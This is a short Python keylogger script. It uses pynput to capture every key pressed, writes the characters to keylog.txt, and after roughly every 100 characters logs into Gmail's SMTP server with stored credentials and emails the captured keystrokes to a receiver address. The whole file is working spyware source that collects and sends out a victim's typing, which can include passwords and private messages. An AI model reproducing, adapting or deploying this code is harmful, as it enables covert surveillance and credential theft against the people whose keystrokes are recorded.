from pynput import keyboard
from pynput.keyboard import Key, Listener
import smtplib
import dotenv
import os
from dotenv import load_dotenv, dotenv_values

load_dotenv()
count = 0
keys = []
sender_email = os.getenv("sender_email")
password = os.getenv("password") 
receiver_email = os.getenv("receiver_email")

def keyPressed(key):
    print(str(key))
    global keys
    global count
    with open ("keylog.txt", "a") as file:
        try:
            keys.append(key.char)
            file.write(str(key.char))
            count += 1
        except:
            print("Error getting char")
        if (count > 100):
            count = 0
            email(keys)
            keys.clear()

def email(keys):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        message = ''.join(keys)
        server.sendmail(sender_email, receiver_email, message)
        server.quit()
        print("Email sent")
    except Exception as e:
        print(f"Error in sending email: {e}")

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

